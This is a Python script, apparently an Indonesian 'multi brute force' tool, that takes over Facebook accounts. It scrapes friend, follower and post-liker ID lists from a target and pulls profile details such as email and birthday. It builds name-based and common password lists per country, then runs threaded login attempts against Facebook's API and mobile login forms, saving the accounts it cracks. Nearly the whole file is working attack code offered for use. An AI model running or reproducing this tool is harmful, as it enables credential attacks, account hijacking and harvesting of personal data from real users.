f#!/usr/bin/python
#-*-coding:utf-8-*-
# Made With ❤️ By Rian Sptr

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""\x1b[0;36m   _____           __    ____
  / ___/____ ___  / /_  / __/
  \__ \/ __ `__ \/ __ \/ /_  
 ___/ / / / / / / /_/ / __/  
/____/_/ /_/ /_/_.___/_/     
\nSimple Multi Brute Force
\x1b[0;37m\nAuthor:Dapunta Khurayra
      :Rian Saputra                   """)
host="https://mbasic.facebook.com"
ok = []
cp = []
ttl =[]
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
durasi = str(datetime.now().strftime("%d/%m/%Y"))
tahun = current.year
bulan = current.month
hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def country():
    os.system("clear")
    banner()
    print("\n%s[%s Pilih Negara %s]\n"%(o,p,o))
    print("%s[%s1%s] %sIndonesia"%(o,p,o,o))
    print("%s[%s2%s] %sBangladesh/India"%(o,p,o,o))
    print("%s[%s3%s] %sPakistan"%(o,p,o,o))
    print("%s[%s4%s] %sUSA"%(o,p,o,o))
    print("%s[%s0%s] %sNone"%(o,p,o,o))
    choose_country()
    
def choose_country():
    cc = input("\n%s[%s•%s] %sPilih : "%(o,p,o,o))
    if cc in[""]:
        print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))
    elif cc in["1","01"]:
        os.system("rm -rf country.txt")
        cou = "id"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["2","02"]:
        os.system("rm -rf country.txt")
        cou = "bd"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["3","03"]:
        os.system("rm -rf country.txt")
        cou = "pk"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["4","04"]:
        os.system("rm -rf country.txt")
        cou = "us"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["0","00"]:
        os.system("rm -rf country.txt")
        cou = " "
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    else:
        print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print((o+"\n["+p+"1"+o+"]"+o+" Login Token"))
  print((o+"["+p+"2"+o+"]"+o+" Login Cookies"))
  print((o+"["+p+"0"+o+"]"+m+" Exit"))
  sek=input(o+"\n["+p+"•"+o+"]"+o+" Pilih : ")
  if sek=="":
    print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))
    logs()
  elif sek=="1":
    defaultua()
    log_token()
  elif sek=="2":
    defaultua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(o+"\n["+p+"•"+o+"]"+o+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((o+"\n["+p+"•"+o+"]"+o+" Login Succes"))
        menu()
    except KeyError:
        print((o+"["+m+"!"+o+"]"+m+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(o+"\n["+p+"•"+o+"]"+o+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((o+"["+m+"!"+o+"]"+m+" Jaringan Tidak Ada"))
        except [KeyError,IOError]:
            print((o+"["+m+"!"+o+"]"+m+" Cookies Invalid"))
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((o+"\n["+p+"•"+o+"]"+o+" Login Succes"))
        menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((o+"["+p+"!"+o+"]"+m+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('country.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "USA"
    elif " " in ngr:
        negara = "None"
    os.system("clear")
    banner()
    print((o+"\n[ "+h+"Welcome "+a["name"]+o+" ]"+p))
    print((o+"\n["+p+"•"+o+"]"+o+" Your ID : "+o+id))
    print((o+"["+p+"•"+o+"]"+o+" Your IP : "+o+ip))
    print((o+"["+p+"•"+o+"]"+o+" Status  : "+h+"Free"+p))
    print((o+"["+p+"•"+o+"]"+o+" Joined  : "+o+durasi))
    print((o+"["+p+"•"+o+"]"+o+" Crack   : "+o+negara))
    print((o+"\n["+p+"1"+o+"]"+o+" Crack ID Dari Public/Teman"))
    print((o+"["+p+"2"+o+"]"+o+" Crack ID Dari Followers"))
    print((o+"["+p+"3"+o+"]"+o+" Crack ID Dari Like Post"))
    print((o+"["+p+"4"+o+"]"+o+" Crack Dari Phone Number"))
    print((o+"["+p+"5"+o+"]"+o+" Crack Dari Email"))
    print((o+"["+p+"6"+o+"]"+o+" Ambil Data Target"))
    print((o+"["+p+"7"+o+"]"+o+" Lihat Hasil Crack"))
    print((o+"["+p+"8"+o+"]"+o+" User Agent"))
    print((o+"["+p+"0"+o+"]"+m+" Logout"))
    choose_menu()

def choose_menu():
	r=input(o+"\n["+p+"•"+o+"]"+o+" Pilih : ")
	if r=="":
		print((o+"["+m+"!"+o+"]"+m+" Isi Dengan Benar"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
		try:
			jalan(o+"\n["+p+"•"+o+"]"+o+" Terima Kasih Sudah Memakai Script Saya:)")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((o+"["+p+"!"+o+"]"+p+" Error %s"%e))
	else:
		print((o+"["+m+"!"+o+"]"+m+" Wrong Input"))
		menu()	

def pilihcrack(file):
  print((o+"\n["+p+"1"+o+"]"+o+" Api ("+o+"Fast"+o+")"))
  print((o+"["+p+"2"+o+"]"+o+" Api + TTL ("+o+"Fast"+o+")"))
  print((o+"["+p+"3"+o+"]"+o+" Mbasic ("+o+"Slow"+o+")"))
  print((o+"["+p+"4"+o+"]"+o+" Mbasic + TTL ("+o+"Slow"+o+")"+h+" Recommend"))
  print((o+"["+p+"5"+o+"]"+o+" Free Facebook ("+o+"Super Slow"+o+")"))
  krah=input(o+"\n["+p+"•"+o+"]"+o+" Pilih : ")
  if krah in[""]:
    print((o+"["+m+"!"+o+"]"+m+" Pilih Yang Benar"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    crackffb(file)
  else:
    print((o+"["+m+"!"+o+"]"+m+" Pilih Yang Benar"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+m+"!"+o+"]"+m+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((o+"\n["+p+"•"+o+"]"+o+" Ketik \'me\' Untuk Dump Dari Daftar Teman"))
		idt = input(o+"["+p+"•"+o+"]"+o+" ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+o+" Nama : "+op["name"]))
		except KeyError:
			print((o+"["+m+"!"+o+"]"+m+" ID Tidak Ada"))
			print((o+"\n[ "+p+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+p+"•"+o+"]"+o+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+m+"!"+o+"]"+m+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+m+"!"+o+"]"+m+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(o+"\n["+p+"•"+o+"]"+o+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+o+" Nama : "+op["name"]))
		except KeyError:
			print((o+"["+m+"!"+o+"]"+m+" ID Tidak Ada"))
			print((o+"\n[ "+o+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+p+"•"+o+"]"+o+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+m+"!"+o+"]"+m+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+m+"!"+o+"]"+m+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(o+"\n["+p+"•"+o+"]"+o+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+p+" Nama : "+op["name"]))
		except KeyError:
			print((o+"["+m+"!"+o+"]"+m+" ID Tidak Ada"))
			print((o+"\n[ "+p+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+p+"•"+o+"]"+o+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(o+"["+m+"!"+o+"]"+m+" Error : %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((o+"\n["+p+"•"+o+"]"+o+" Number Harus 5 Digit"))
  print((o+"["+p+"•"+o+"]"+o+" Contoh : 92037"))
  kode=str(input(o+"["+p+"•"+o+"]"+o+" Masukan Number : "))
  exit((o+"\n["+m+"!"+o+"]"+m+" Number Harus 5 Digit")) if len(kode) < 5 else ''
  exit((o+"\n["+m+"!"+o+"]"+m+" Number Harus 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(o+"["+p+"•"+o+"]"+o+" Jumlah : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(o+"\n["+p+"•"+o+"]"+p+" Crack Mulai, Mohon Tunggu...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(o+"\n["+p+"•"+o+"]"+o+" Nama Target : ")
  domain=input(o+"["+p+"•"+o+"]"+o+" Pilih Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((o+"["+m+"!"+o+"]"+m+" Isi Dengan Benar")) if not domain in ['g','y','h'] else ''
  jml=int(input(o+"["+p+"•"+o+"]"+o+" Jumlah : "))
  setpw=input(o+"["+p+"•"+o+"]"+o+" Atur Kata Sandi : ").split(',')
  print(o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai, Mohon Tunggu...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;36m[\x1b[0;32mOK\x1b[0;36m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+m+"!"+o+"]"+m+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(o+"\n["+p+"•"+o+"]"+o+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+o+" Nama Account     : "+op["name"]))
			print((o+"["+p+"•"+o+"]"+o+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+o+" Email            : "+op["email"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+o+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+o+" Tanggal Lahir    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Tanggal Lahir    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+o+" Gender           : "+op["gender"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((o+"["+p+"•"+o+"]"+o+" Total Teman      : %s"%(len(id))))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+o+" Total Teman      : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((o+"["+p+"•"+o+"]"+o+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+o+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+o+" Website          : "+op["website"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+o+" Website          : -"))
			except IOError:
				print((o+"["+p+"•"+o+"]"+o+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+o+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+o+" Update Time      : -"))
			except IOError:
				print((o+"["+p+"•"+o+"]"+o+" Update Time      : -"))
			input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
			menu()
		except KeyError:
			input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
			menu()
	except Exception as e:
		exit(o+"["+m+"!"+o+"]"+m+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	ct = open('country.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bangsat")
					results.append("bagong")
					results.append("indonesia")
					results.append("kontol")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("Bangladesh")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
	return results

### USER AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n%s[%s1%s] %sDapatkan User Agent"%(o,p,o,o))
    print("%s[%s2%s] %sGanti User Agent"%(o,p,o,o))
    print("%s[%s3%s] %sHapus User Agent"%(o,p,o,o))
    print("%s[%s4%s] %sCek User Agent"%(o,p,o,o))
    print("%s[%s0%s] %sKembali"%(o,p,o,o))
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = input("\n%s[%s•%s] %sPilih : "%(o,p,o,o))
    if pmu in[""]:
        print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))
    elif pmu in["1","01"]:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
        menu()
    elif pmu in["2","02"]:
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n%s[%s!%s] %sUser Agent Di Hapus"%(o,m,o,m))
        input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
        menu()
    elif pmu in["4","04"]:
        check_ugent()
    elif pmu in["0","00"]:
        menu()
    else:
        print((o+"\n["+m+"!"+o+"]"+m+" Isi Dengan Benar"))

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = input("\n%s[%s•%s] %sMasukan User Agent : \n\n%s"%(o,p,o,o,h))
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n%s[%s•%s] %sBerhasil Mengganti User Agent"%(h,p,h,p))
        input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
        menu()
    except (KeyError, IOError):
        jalan("\n%s[%s!%s] %sGagal Mengganti User Agent"%(o,m,o,m))
        input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = ("%s[%s!%s] %sUser Agent Tidak Ada"%(o,m,o,m))
    except:pass
    print ("\n%s[%s•%s] %sUser Agent Kamu: \n\n%s%s"%(o,p,o,p,h,ungser))
    input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
    menu()

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+p+"•"+o+"]"+o+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(o+"["+p+"•"+o+"]"+o+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+p+"•"+o+"]"+o+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+p+"•"+o+"]"+o+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
